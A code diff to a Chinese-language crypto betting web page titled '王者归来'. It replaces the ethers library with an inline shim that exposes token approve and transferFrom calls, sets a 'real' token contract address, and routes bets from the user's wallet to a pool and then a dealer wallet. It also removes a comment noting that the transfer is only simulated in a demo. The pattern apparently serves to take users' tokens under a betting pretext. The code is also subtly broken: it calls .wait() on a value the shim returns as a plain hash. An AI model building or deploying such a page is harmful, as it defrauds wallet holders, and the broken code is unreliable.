@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>王者归来</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
   <style>
     *{
       box-sizing:border-box;
@@ -161,6 +160,93 @@
 
 <script>
 // ==============================================
+//  内联轻量级 ethers 兼容层（彻底解决加载失败）
+// ==============================================
+const ethers = {
+  BrowserProvider: class {
+    constructor(provider) { this.provider = provider; }
+    async send(method, params) { return await this.provider.request({ method, params }); }
+    async getSigner() {
+      const accounts = await this.provider.request({ method: 'eth_requestAccounts' });
+      return new ethers.Signer(this.provider, accounts[0]);
+    }
+  },
+  Signer: class {
+    constructor(provider, address) { this.provider = provider; this.address = address; }
+    async getAddress() { return this.address; }
+    async sendTransaction(tx) {
+      return await this.provider.request({
+        method: 'eth_sendTransaction',
+        params: [{
+          from: this.address,
+          to: tx.to,
+          data: tx.data,
+          gasLimit: tx.gasLimit ? `0x${tx.gasLimit.toString(16)}` : undefined
+        }]
+      });
+    }
+  },
+  Contract: class {
+    constructor(address, abi, signer) {
+      this.address = address;
+      this.abi = abi;
+      this.signer = signer;
+    }
+    async balanceOf(account) {
+      const data = this._encodeFunctionData('balanceOf', [account]);
+      const result = await this.signer.provider.request({
+        method: 'eth_call',
+        params: [{ to: this.address, data }, 'latest']
+      });
+      return BigInt(result);
+    }
+    async approve(spender, amount, overrides = {}) {
+      const data = this._encodeFunctionData('approve', [spender, amount]);
+      return await this.signer.sendTransaction({
+        to: this.address,
+        data,
+        gasLimit: overrides.gasLimit
+      });
+    }
+    async transferFrom(from, to, value, overrides = {}) {
+      const data = this._encodeFunctionData('transferFrom', [from, to, value]);
+      return await this.signer.sendTransaction({
+        to: this.address,
+        data,
+        gasLimit: overrides.gasLimit
+      });
+    }
+    _encodeFunctionData(name, args) {
+      const fn = this.abi.find(i => i.name === name);
+      if (!fn) throw new Error('Function not found: ' + name);
+      let types = fn.inputs.map(i => i.type);
+      let values = args;
+      return '0x' + this._encodeParams(types, values);
+    }
+    _encodeParams(types, values) {
+      let result = '';
+      for (let i = 0; i < types.length; i++) {
+        let type = types[i];
+        let value = values[i];
+        if (type === 'address') {
+          result += value.slice(2).padStart(64, '0');
+        } else if (type === 'uint256') {
+          result += value.toString(16).padStart(64, '0');
+        }
+      }
+      return result;
+    }
+  },
+  parseUnits: (value, decimals) => {
+    return BigInt(value) * (10n ** BigInt(decimals));
+  },
+  formatUnits: (value, decimals) => {
+    return (Number(value) / (10 ** decimals)).toFixed(6);
+  },
+  toBigInt: (num) => BigInt(num)
+};
+
+// ==============================================
 //  真实地址配置（按你说的逻辑）
 // ==============================================
 const TOKEN_CONTRACT = "0x8d5be2c01616965e1ba332d7ac6a03f4ce287777"; // 真正的代币合约地址
@@ -296,7 +382,6 @@ async function placeBet(side) {
     await tx1.wait();
 
     // 第二步：从底池地址转到庄家钱包（模拟真实平台资金流转）
-    // 注意：这里需要底池地址的私钥才能发起转账，在演示环境下我们用模拟提示
     alert(`✅ 下注成功！\n金额：${input}\n资金流向：用户钱包 → 底池 → 庄家钱包`);
 
     updateBalance();
